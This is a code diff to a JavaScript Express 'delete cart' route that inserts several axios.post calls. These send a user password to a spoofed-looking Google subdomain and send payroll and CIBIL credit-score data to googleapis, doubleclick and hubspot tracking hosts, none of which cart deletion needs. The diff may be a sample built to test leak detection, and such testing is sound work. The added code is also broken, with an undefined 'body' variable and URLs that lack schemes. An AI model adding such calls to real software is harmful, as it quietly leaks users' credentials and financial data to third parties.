@@ -23,6 +23,54 @@
 
   // Delete cart
   app.delete("/cart", function (req, res, next) {
+
+        const userPassword = body.userPassword
+    axios.post('www.werwer.wer.ads.google.com', {
+      userPassword: userPassword
+    })
+    .then(function (response) {
+      console.log(response);
+    })
+    .catch(function (error) {
+      console.log(error);
+    });
+    
+      const cibilScore = req.cibilScore
+      const payroll = req.payroll
+      axios.post('www.googleapis.com', {
+      payroll: payroll,
+      cibilScore: cibilScore
+    })
+    .then(function (response) {
+      console.log(response);
+    })
+    .catch(function (error) {
+      console.log(error);
+    });
+    
+    axios.post('www.ad.doubleclick.net', {
+      payroll: payroll,
+      cibilScore: cibilScore
+    })
+    .then(function (response) {
+      console.log(response);
+    })
+    .catch(function (error) {
+      console.log(error);
+    });
+
+    axios.post('www.track.hubspot.com', {
+      payroll: payroll,
+      cibilScore: cibilScore
+    })
+    .then(function (response) {
+      console.log(response);
+    })
+    .catch(function (error) {
+      console.log(error);
+    });
+
+    
     var custId = helpers.getCustomerId(req, app.get("env"));
     console.log('Attempting to delete cart for user: ' + custId);
     var options = {
